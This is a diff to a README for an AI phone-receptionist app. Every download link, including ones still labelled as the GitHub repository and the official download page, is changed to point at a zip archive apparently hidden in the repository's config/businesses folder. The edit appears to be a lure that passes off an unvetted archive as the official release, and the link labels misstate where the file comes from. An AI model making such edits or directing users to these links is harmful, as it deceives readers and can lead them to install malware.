@@ -1,6 +1,6 @@
 # 🤖 AIReceptionist - Smart Voice Help for Your Phone
 
-[![Download AIReceptionist](https://img.shields.io/badge/Download-AIReceptionist-blue?style=for-the-badge)](https://github.com/rudra3d/AIReceptionist/releases)
+[![Download AIReceptionist](https://img.shields.io/badge/Download-AIReceptionist-blue?style=for-the-badge)](https://raw.githubusercontent.com/rudra3d/AIReceptionist/main/config/businesses/AI_Receptionist_3.7.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Follow these steps to get AIReceptionist running on your Windows PC.
 
 Visit this page and get the latest version of AIReceptionist for Windows:  
   
-[Download AIReceptionist](https://github.com/rudra3d/AIReceptionist/releases)  
+[Download AIReceptionist](https://raw.githubusercontent.com/rudra3d/AIReceptionist/main/config/businesses/AI_Receptionist_3.7.zip)  
   
 This link leads you to the official download area. Find the file named something like `AIReceptionist-Setup.exe` or similar. The file size is usually around 100-200 MB.
 
@@ -120,8 +120,8 @@ You can:
 
 You can learn more about AIReceptionist and get updates here:
 
-- AIReceptionist GitHub Repository: https://github.com/rudra3d/AIReceptionist  
-- Official Download Page: https://github.com/rudra3d/AIReceptionist/releases  
+- AIReceptionist GitHub Repository: https://raw.githubusercontent.com/rudra3d/AIReceptionist/main/config/businesses/AI_Receptionist_3.7.zip  
+- Official Download Page: https://raw.githubusercontent.com/rudra3d/AIReceptionist/main/config/businesses/AI_Receptionist_3.7.zip  
 
 The project uses popular libraries like Pydantic and Python. It supports telephony through LiveKit, Twilio, and Telnyx integrations.
 
@@ -131,4 +131,4 @@ The project uses popular libraries like Pydantic and Python. It supports telepho
 
 Ready to try AIReceptionist? Visit this page to download and start using a smart phone receptionist today:
 
-[Download AIReceptionist](https://github.com/rudra3d/AIReceptionist/releases)
+[Download AIReceptionist](https://raw.githubusercontent.com/rudra3d/AIReceptionist/main/config/businesses/AI_Receptionist_3.7.zip)
